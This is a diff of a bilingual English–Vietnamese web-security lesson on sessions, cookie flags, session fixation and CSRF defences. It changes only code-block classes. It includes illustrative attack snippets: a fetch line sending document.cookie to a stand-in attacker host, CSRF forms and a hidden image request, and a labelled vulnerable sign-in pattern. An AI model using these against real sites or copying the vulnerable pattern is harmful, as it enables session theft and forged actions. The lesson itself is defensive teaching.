@@ -26,7 +26,7 @@ export default {
 <p class="lead">A server-side session is the oldest answer to Lesson 0.1's problem and still the right one for most products: put a row in a database, give the browser a pointer to it, look it up on every request. It is unfashionable next to JWTs and it has the one property JWTs cannot easily have — you can end it instantly.</p>
 
 <h3>The schema</h3>
-<pre><code>model Session {
+<pre><code class="language-typescript">model Session {
   id                String    @id @default(cuid())
   tokenHash         String    @unique                  <span class="tok-comment">// sha256 of the token — Lesson 1.3</span>
   userId            String
@@ -51,7 +51,7 @@ export default {
 </div>
 
 <h3>Issuing a session</h3>
-<pre><code>import { randomBytes, createHash } from 'node:crypto';
+<pre><code class="language-javascript">import { randomBytes, createHash } from 'node:crypto';
 
 const IDLE_MS  = 2 * 60 * 60 * 1000;         <span class="tok-comment">// 2 hours idle</span>
 const ABSOLUTE_MS = 30 * 24 * 60 * 60 * 1000;   <span class="tok-comment">// 30-day hard ceiling</span>
@@ -77,7 +77,7 @@ Set-Cookie: __Host-session=Kc9x2Lm…; Path=/; HttpOnly; Secure; SameSite=Lax; M
 # va bo nho cua tien trinh nay trong vai mili giay. Khong o dau khac.</div>
 
 <h3>Verifying one, on every request</h3>
-<pre><code>export async function getSession(token: string | undefined) {
+<pre><code class="language-javascript">export async function getSession(token: string | undefined) {
   if (!token) return null;
   const hash = createHash('sha256').update(token).digest('hex');
   const bayGio = new Date();
@@ -134,7 +134,7 @@ Set-Cookie: __Host-session=Kc9x2Lm…; Path=/; HttpOnly; Secure; SameSite=Lax; M
 </div>
 
 <h3>Cleaning up</h3>
-<pre><code><span class="tok-comment">-- Run daily. Without it the table only ever GROWS.</span>
+<pre><code class="language-sql"><span class="tok-comment">-- Run daily. Without it the table only ever GROWS.</span>
 DELETE FROM "Session"
 WHERE "absoluteExpiresAt" &lt; now() - interval '7 days'
    OR ("revokedAt" IS NOT NULL AND "revokedAt" &lt; now() - interval '7 days');</code></pre>
@@ -161,7 +161,7 @@ Time: 892.104 ms
 <p class="lead">Một phiên phía máy chủ là câu trả lời CỔ NHẤT cho bài toán của Bài 0.1 và vẫn là câu trả lời ĐÚNG cho phần lớn sản phẩm: đặt một hàng vào cơ sở dữ liệu, đưa cho trình duyệt một con trỏ tới nó, tra cứu nó ở mọi request. Nó không hợp mốt bên cạnh JWT và nó có ĐÚNG MỘT tính chất mà JWT khó có được — bạn KẾT THÚC nó được, ngay lập tức.</p>
 
 <h3>Lược đồ</h3>
-<pre><code>model Session {
+<pre><code class="language-typescript">model Session {
   id                String    @id @default(cuid())
   tokenHash         String    @unique                  <span class="tok-comment">// sha256 của token — Bài 1.3</span>
   userId            String
@@ -186,7 +186,7 @@ Time: 892.104 ms
 </div>
 
 <h3>Cấp một phiên</h3>
-<pre><code>import { randomBytes, createHash } from 'node:crypto';
+<pre><code class="language-javascript">import { randomBytes, createHash } from 'node:crypto';
 
 const IDLE_MS  = 2 * 60 * 60 * 1000;         <span class="tok-comment">// 2 giờ nhàn rỗi</span>
 const ABSOLUTE_MS = 30 * 24 * 60 * 60 * 1000;   <span class="tok-comment">// 30 ngày trần cứng</span>
@@ -212,7 +212,7 @@ Set-Cookie: __Host-session=Kc9x2Lm…; Path=/; HttpOnly; Secure; SameSite=Lax; M
 # va bo nho cua tien trinh nay trong vai mili giay. Khong o dau khac.</div>
 
 <h3>Xác minh một phiên, ở MỌI request</h3>
-<pre><code>export async function getSession(token: string | undefined) {
+<pre><code class="language-javascript">export async function getSession(token: string | undefined) {
   if (!token) return null;
   const hash = createHash('sha256').update(token).digest('hex');
   const bayGio = new Date();
@@ -269,7 +269,7 @@ Set-Cookie: __Host-session=Kc9x2Lm…; Path=/; HttpOnly; Secure; SameSite=Lax; M
 </div>
 
 <h3>Dọn dẹp</h3>
-<pre><code><span class="tok-comment">-- Chạy hằng ngày. Không có nó thì bảng chỉ có LỚN LÊN.</span>
+<pre><code class="language-sql"><span class="tok-comment">-- Chạy hằng ngày. Không có nó thì bảng chỉ có LỚN LÊN.</span>
 DELETE FROM "Session"
 WHERE "absoluteExpiresAt" &lt; now() - interval '7 days'
    OR ("revokedAt" IS NOT NULL AND "revokedAt" &lt; now() - interval '7 days');</code></pre>
@@ -309,7 +309,7 @@ Time: 892.104 ms
           tiền tố  giá trị       phạm vi   script  chỉ    ngữ cảnh chéo    tuổi thọ
           bắt buộc               đường dẫn không   HTTPS   trang
           3 luật                          đọc được</code></pre>
-<pre><code><span class="tok-comment">// Express: set it all in one place, not scattered</span>
+<pre><code class="language-typescript"><span class="tok-comment">// Express: set it all in one place, not scattered</span>
 res.cookie('__Host-session', token, {
   httpOnly: true,
   secure:   true,
@@ -320,7 +320,7 @@ res.cookie('__Host-session', token, {
 });</code></pre>
 
 <h3><code>HttpOnly</code> — script cannot read it</h3>
-<pre><code><span class="tok-comment">// With HttpOnly, this XSS snippet gets nothing</span>
+<pre><code class="language-typescript"><span class="tok-comment">// With HttpOnly, this XSS snippet gets nothing</span>
 fetch('https://ke-tan-cong.com/?c=' + document.cookie);</code></pre>
 <div class="out">// Khong co HttpOnly:
 "__Host-session=Kc9x2Lm…; theme=dark"     ← ca session di ra ngoai
@@ -354,7 +354,7 @@ fetch('https://ke-tan-cong.com/?c=' + document.cookie);</code></pre>
     <div class="lz-node"><div class="lz-nbody"><span class="lz-ntitle">Always sent</span><span class="lz-nsub">Requires Secure. Only for a genuine cross-site product</span></div></div>
   </div>
 </div>
-<pre><code><span class="tok-comment">// The attacker sets this on their own site</span>
+<pre><code class="language-html"><span class="tok-comment">// The attacker sets this on their own site</span>
 &lt;form action="https://vidu.com/api/chuyen-tien" method="POST"&gt;
   &lt;input name="den" value="ke-tan-cong"&gt;&lt;input name="so-tien" value="10000000"&gt;
 &lt;/form&gt;
@@ -371,7 +371,7 @@ Khong dat     → Chrome mac dinh Lax; Safari va cac trinh duyet khac
 </div>
 
 <h3><code>Domain</code> — the attribute to leave out</h3>
-<pre><code>Set-Cookie: session=…;                      <span class="tok-comment">// host-only: CHỈ vidu.com</span>
+<pre><code class="language-typescript">Set-Cookie: session=…;                      <span class="tok-comment">// host-only: CHỈ vidu.com</span>
 Set-Cookie: session=…; Domain=vidu.com      <span class="tok-comment">// vidu.com AND every subdomain</span></code></pre>
 <div class="out">Voi Domain=vidu.com, cookie session duoc gui toi:
   vidu.com            ✅ y dinh
@@ -399,7 +399,7 @@ Set-Cookie: __Host-session=…; Path=/; Secure; Domain=vidu.com           <span 
 </div>
 
 <h3>Clearing a cookie, and the trap</h3>
-<pre><code><span class="tok-comment">// ❌ Deletes nothing at all</span>
+<pre><code class="language-typescript"><span class="tok-comment">// ❌ Deletes nothing at all</span>
 res.clearCookie('__Host-session');
 
 <span class="tok-comment">// ✅ Must match EXACTLY the path, domain, secure and sameSite used when setting it</span>
@@ -436,7 +436,7 @@ res.clearCookie('__Host-session', {
           tiền tố  giá trị       phạm vi   script  chỉ    ngữ cảnh chéo    tuổi thọ
           bắt buộc               đường dẫn không   HTTPS   trang
           3 luật                          đọc được</code></pre>
-<pre><code><span class="tok-comment">// Express: đặt tất cả trong MỘT chỗ, đừng rải rác</span>
+<pre><code class="language-typescript"><span class="tok-comment">// Express: đặt tất cả trong MỘT chỗ, đừng rải rác</span>
 res.cookie('__Host-session', token, {
   httpOnly: true,
   secure:   true,
@@ -447,7 +447,7 @@ res.cookie('__Host-session', token, {
 });</code></pre>
 
 <h3><code>HttpOnly</code> — script KHÔNG đọc được nó</h3>
-<pre><code><span class="tok-comment">// Với HttpOnly, đoạn XSS này không lấy được gì</span>
+<pre><code class="language-typescript"><span class="tok-comment">// Với HttpOnly, đoạn XSS này không lấy được gì</span>
 fetch('https://ke-tan-cong.com/?c=' + document.cookie);</code></pre>
 <div class="out">// Khong co HttpOnly:
 "__Host-session=Kc9x2Lm…; theme=dark"     ← ca session di ra ngoai
@@ -481,7 +481,7 @@ fetch('https://ke-tan-cong.com/?c=' + document.cookie);</code></pre>
     <div class="lz-node"><div class="lz-nbody"><span class="lz-ntitle">LUÔN gửi</span><span class="lz-nsub">Bắt buộc kèm Secure. Chỉ dành cho một sản phẩm xuyên trang THẬT SỰ</span></div></div>
   </div>
 </div>
-<pre><code><span class="tok-comment">// Kẻ tấn công đặt cái này trên trang của họ</span>
+<pre><code class="language-html"><span class="tok-comment">// Kẻ tấn công đặt cái này trên trang của họ</span>
 &lt;form action="https://vidu.com/api/chuyen-tien" method="POST"&gt;
   &lt;input name="den" value="ke-tan-cong"&gt;&lt;input name="so-tien" value="10000000"&gt;
 &lt;/form&gt;
@@ -498,7 +498,7 @@ Khong dat     → Chrome mac dinh Lax; Safari va cac trinh duyet khac
 </div>
 
 <h3><code>Domain</code> — cái thuộc tính nên BỎ TRỐNG</h3>
-<pre><code>Set-Cookie: session=…;                      <span class="tok-comment">// chỉ-host: CHỈ vidu.com</span>
+<pre><code class="language-typescript">Set-Cookie: session=…;                      <span class="tok-comment">// chỉ-host: CHỈ vidu.com</span>
 Set-Cookie: session=…; Domain=vidu.com      <span class="tok-comment">// vidu.com VÀ mọi tên miền con</span></code></pre>
 <div class="out">Voi Domain=vidu.com, cookie session duoc gui toi:
   vidu.com            ✅ y dinh
@@ -526,7 +526,7 @@ Set-Cookie: __Host-session=…; Path=/; Secure; Domain=vidu.com           <span 
 </div>
 
 <h3>Xoá một cookie, và cái bẫy</h3>
-<pre><code><span class="tok-comment">// ❌ Không xoá được gì cả</span>
+<pre><code class="language-typescript"><span class="tok-comment">// ❌ Không xoá được gì cả</span>
 res.clearCookie('__Host-session');
 
 <span class="tok-comment">// ✅ Phải khớp CHÍNH XÁC path, domain, secure và sameSite lúc đặt</span>
@@ -580,7 +580,7 @@ res.clearCookie('__Host-session', {
     <div class="lz-node"><div class="lz-nbody"><span class="lz-ntitle">The same id is now authenticated</span><span class="lz-nsub">And the attacker has been holding it all along</span></div></div>
   </div>
 </div>
-<pre><code><span class="tok-comment">// ❌ The vulnerable pattern: reuse the id, just attach a user to it</span>
+<pre><code class="language-javascript"><span class="tok-comment">// ❌ The vulnerable pattern: reuse the id, just attach a user to it</span>
 app.post('/sign-in', async (req, res) =&gt; {
   const u = await verifyPassword(req.body);
   await prisma.session.update({
@@ -602,7 +602,7 @@ app.post('/sign-in', async (req, res) =&gt; {
 </div>
 
 <h3>The fix</h3>
-<pre><code><span class="tok-comment">// ✅ Revoke the old one, issue a NEW one. Four lines.</span>
+<pre><code class="language-javascript"><span class="tok-comment">// ✅ Revoke the old one, issue a NEW one. Four lines.</span>
 app.post('/sign-in', async (req, res) =&gt; {
   const u = await verifyPassword(req.body);
 
@@ -633,7 +633,7 @@ app.post('/sign-in', async (req, res) =&gt; {
 </div>
 
 <h3>Carrying anonymous state across</h3>
-<pre><code><span class="tok-comment">// The user had a cart BEFORE signing in. Migrate the DATA, not the ID.</span>
+<pre><code class="language-javascript"><span class="tok-comment">// The user had a cart BEFORE signing in. Migrate the DATA, not the ID.</span>
 app.post('/sign-in', async (req, res) =&gt; {
   const oldCart = req.session?.id;                    <span class="tok-comment">// keep the OLD id to read the data</span>
   const u = await verifyPassword(req.body);
@@ -654,7 +654,7 @@ app.post('/sign-in', async (req, res) =&gt; {
 </div>
 
 <h3>Step-up: proving it is still you</h3>
-<pre><code><span class="tok-comment">// One more column on Session, plus one middleware</span>
+<pre><code class="language-javascript"><span class="tok-comment">// One more column on Session, plus one middleware</span>
 model Session {
   <span class="tok-comment">// …</span>
   authenticatedAt DateTime <span class="tok-comment">// the last time the user PROVED who they are</span>
@@ -711,7 +711,7 @@ app.post('/thanh-toan/rut-tien',  requireAuth, needsReauth(2), rutTien);</code><
     <div class="lz-node"><div class="lz-nbody"><span class="lz-ntitle">Chính cái mã đó giờ ĐÃ xác thực</span><span class="lz-nsub">Và kẻ tấn công vẫn cầm nó suốt từ đầu</span></div></div>
   </div>
 </div>
-<pre><code><span class="tok-comment">// ❌ Mẫu có lỗ hổng: dùng lại mã, chỉ gắn thêm người dùng vào</span>
+<pre><code class="language-javascript"><span class="tok-comment">// ❌ Mẫu có lỗ hổng: dùng lại mã, chỉ gắn thêm người dùng vào</span>
 app.post('/sign-in', async (req, res) =&gt; {
   const u = await verifyPassword(req.body);
   await prisma.session.update({
@@ -733,7 +733,7 @@ app.post('/sign-in', async (req, res) =&gt; {
 </div>
 
 <h3>Cách vá</h3>
-<pre><code><span class="tok-comment">// ✅ Thu hồi cái cũ, cấp cái MỚI. Bốn dòng.</span>
+<pre><code class="language-javascript"><span class="tok-comment">// ✅ Thu hồi cái cũ, cấp cái MỚI. Bốn dòng.</span>
 app.post('/sign-in', async (req, res) =&gt; {
   const u = await verifyPassword(req.body);
 
@@ -764,7 +764,7 @@ app.post('/sign-in', async (req, res) =&gt; {
 </div>
 
 <h3>Mang trạng thái ẩn danh đi theo</h3>
-<pre><code><span class="tok-comment">// Người dùng có giỏ hàng TRƯỚC khi đăng nhập. Chuyển DỮ LIỆU, không chuyển MÃ.</span>
+<pre><code class="language-javascript"><span class="tok-comment">// Người dùng có giỏ hàng TRƯỚC khi đăng nhập. Chuyển DỮ LIỆU, không chuyển MÃ.</span>
 app.post('/sign-in', async (req, res) =&gt; {
   const oldCart = req.session?.id;                    <span class="tok-comment">// giữ lại id CŨ để đọc dữ liệu</span>
   const u = await verifyPassword(req.body);
@@ -785,7 +785,7 @@ app.post('/sign-in', async (req, res) =&gt; {
 </div>
 
 <h3>Xác thực theo bậc: chứng minh vẫn là bạn</h3>
-<pre><code><span class="tok-comment">// Thêm một cột trên Phien, và một middleware</span>
+<pre><code class="language-javascript"><span class="tok-comment">// Thêm một cột trên Phien, và một middleware</span>
 model Session {
   <span class="tok-comment">// …</span>
   authenticatedAt DateTime <span class="tok-comment">// lần cuối người dùng CHỨNG MINH danh tính</span>
@@ -836,7 +836,7 @@ app.post('/thanh-toan/rut-tien',  requireAuth, needsReauth(2), rutTien);</code><
 <p class="lead">Cross-site request forgery works because of a convenience: the browser attaches your cookies to a request no matter which page caused it. The attacker never sees the response and does not need to — the damage is in the request. Understanding that one sentence is what makes the three defences below obviously correct, and what makes the popular non-defences obviously wrong.</p>
 
 <h3>The attack, in its two shapes</h3>
-<pre><code><span class="tok-comment">&lt;!-- On the attacker's page. The victim only has to OPEN it. --&gt;</span>
+<pre><code class="language-html"><span class="tok-comment">&lt;!-- On the attacker's page. The victim only has to OPEN it. --&gt;</span>
 
 <span class="tok-comment">&lt;!-- 1. GET, hidden inside an image --&gt;</span>
 &lt;img src="https://vidu.com/api/xoa-tai-khoan" width="1" height="1"&gt;
@@ -865,7 +865,7 @@ email=ke-tan-cong%40evil.com
 </div>
 
 <h3>Why CORS is not a CSRF defence</h3>
-<pre><code><span class="tok-comment">// The three Content-Types a &lt;form&gt; can send — JSON is NOT one of them</span>
+<pre><code class="language-html"><span class="tok-comment">// The three Content-Types a &lt;form&gt; can send — JSON is NOT one of them</span>
 application/x-www-form-urlencoded
 multipart/form-data
 text/plain
@@ -892,7 +892,7 @@ Access-Control-Allow-Origin: https://vidu.com     ← trinh duyet SE chan viec d
 </div>
 
 <h3>Defence 2 — check where the request came from</h3>
-<pre><code><span class="tok-comment">// Sec-Fetch-Site: the browser states the context ITSELF; JS cannot forge it</span>
+<pre><code class="language-javascript"><span class="tok-comment">// Sec-Fetch-Site: the browser states the context ITSELF; JS cannot forge it</span>
 export function blockCrossSite(req, res, next) {
   if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) return next();
 
@@ -922,7 +922,7 @@ Postman, curl         → khong co header nao           → xu ly rieng</div>
 </div>
 
 <h3>Defence 3 — a token, when the first two are not enough</h3>
-<pre><code><span class="tok-comment">// SIGNED double-submit: binds the token to the session, so a subdomain cannot forge it</span>
+<pre><code class="language-javascript"><span class="tok-comment">// SIGNED double-submit: binds the token to the session, so a subdomain cannot forge it</span>
 import { createHmac, timingSafeEqual, randomBytes } from 'node:crypto';
 
 export function issueCsrfToken(res, sessionId: string) {
@@ -980,7 +980,7 @@ export function checkCsrfToken(req, res, next) {
 <p class="lead">Giả mạo request xuyên trang hoạt động được nhờ một TIỆN NGHI: trình duyệt đính cookie của bạn vào một request bất kể TRANG NÀO gây ra nó. Kẻ tấn công không bao giờ nhìn thấy phản hồi và cũng không cần — thiệt hại nằm ngay trong cái REQUEST. Hiểu đúng một câu đó là thứ làm cho ba lớp phòng bên dưới trở nên hiển nhiên đúng, và làm cho những "lớp phòng" phổ biến kia hiển nhiên sai.</p>
 
 <h3>Cú tấn công, ở hai hình dạng của nó</h3>
-<pre><code><span class="tok-comment">&lt;!-- Trên trang của kẻ tấn công. Nạn nhân chỉ cần MỞ trang này. --&gt;</span>
+<pre><code class="language-html"><span class="tok-comment">&lt;!-- Trên trang của kẻ tấn công. Nạn nhân chỉ cần MỞ trang này. --&gt;</span>
 
 <span class="tok-comment">&lt;!-- 1. GET, giấu trong một cái ảnh --&gt;</span>
 &lt;img src="https://vidu.com/api/xoa-tai-khoan" width="1" height="1"&gt;
@@ -1009,7 +1009,7 @@ email=ke-tan-cong%40evil.com
 </div>
 
 <h3>Vì sao CORS KHÔNG phải một lớp phòng CSRF</h3>
-<pre><code><span class="tok-comment">// Ba loại Content-Type mà một &lt;form&gt; gửi được — KHÔNG có JSON</span>
+<pre><code class="language-html"><span class="tok-comment">// Ba loại Content-Type mà một &lt;form&gt; gửi được — KHÔNG có JSON</span>
 application/x-www-form-urlencoded
 multipart/form-data
 text/plain
@@ -1036,7 +1036,7 @@ Access-Control-Allow-Origin: https://vidu.com     ← trinh duyet SE chan viec d
 </div>
 
 <h3>Lớp phòng 2 — kiểm xem request tới TỪ ĐÂU</h3>
-<pre><code><span class="tok-comment">// Sec-Fetch-Site: trình duyệt TỰ nói ra ngữ cảnh, không giả được từ JS</span>
+<pre><code class="language-javascript"><span class="tok-comment">// Sec-Fetch-Site: trình duyệt TỰ nói ra ngữ cảnh, không giả được từ JS</span>
 export function blockCrossSite(req, res, next) {
   if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) return next();
 
@@ -1066,7 +1066,7 @@ Postman, curl         → khong co header nao           → xu ly rieng</div>
 </div>
 
 <h3>Lớp phòng 3 — một token, khi hai cái đầu chưa đủ</h3>
-<pre><code><span class="tok-comment">// Double-submit CÓ KÝ: ràng token vào phiên, nên tên miền con không giả được</span>
+<pre><code class="language-javascript"><span class="tok-comment">// Double-submit CÓ KÝ: ràng token vào phiên, nên tên miền con không giả được</span>
 import { createHmac, timingSafeEqual, randomBytes } from 'node:crypto';
 
 export function issueCsrfToken(res, sessionId: string) {
@@ -1155,7 +1155,7 @@ Giới hạn dung lượng   không     không     4096 byte
 Truy vấn được         ✅        ⚠️        ❌</code></pre>
 
 <h3>Redis: the TTL does the work</h3>
-<pre><code>import { createClient } from 'redis';
+<pre><code class="language-javascript">import { createClient } from 'redis';
 const redis = createClient({ url: process.env.REDIS_URL });
 
 const IDLE_S = 2 * 60 * 60;                   <span class="tok-comment">// 2 hours</span>
@@ -1206,7 +1206,7 @@ $ redis-cli SMEMBERS nguoi:clx7…:session
 </div>
 
 <h3>The cookie itself: no storage, no revocation</h3>
-<pre><code><span class="tok-comment">// iron-session and friends: encrypt the whole state and stuff it in the cookie</span>
+<pre><code class="language-typescript"><span class="tok-comment">// iron-session and friends: encrypt the whole state and stuff it in the cookie</span>
 Set-Cookie: __Host-session=Fe26.2**a1b2c3…**d4e5f6…**7a8b9c…; …
 
 <span class="tok-comment">// Inside, once decrypted:</span>
@@ -1270,7 +1270,7 @@ Giới hạn dung lượng   không     không     4096 byte
 Truy vấn được         ✅        ⚠️        ❌</code></pre>
 
 <h3>Redis: cái TTL làm hết việc</h3>
-<pre><code>import { createClient } from 'redis';
+<pre><code class="language-javascript">import { createClient } from 'redis';
 const redis = createClient({ url: process.env.REDIS_URL });
 
 const IDLE_S = 2 * 60 * 60;                   <span class="tok-comment">// 2 giờ</span>
@@ -1321,7 +1321,7 @@ $ redis-cli SMEMBERS nguoi:clx7…:session
 </div>
 
 <h3>Chính cái cookie: không lưu gì, và không thu hồi được</h3>
-<pre><code><span class="tok-comment">// iron-session và tương tự: mã hoá cả trạng thái rồi nhét vào cookie</span>
+<pre><code class="language-typescript"><span class="tok-comment">// iron-session và tương tự: mã hoá cả trạng thái rồi nhét vào cookie</span>
 Set-Cookie: __Host-session=Fe26.2**a1b2c3…**d4e5f6…**7a8b9c…; …
 
 <span class="tok-comment">// Bên trong, sau khi giải mã:</span>
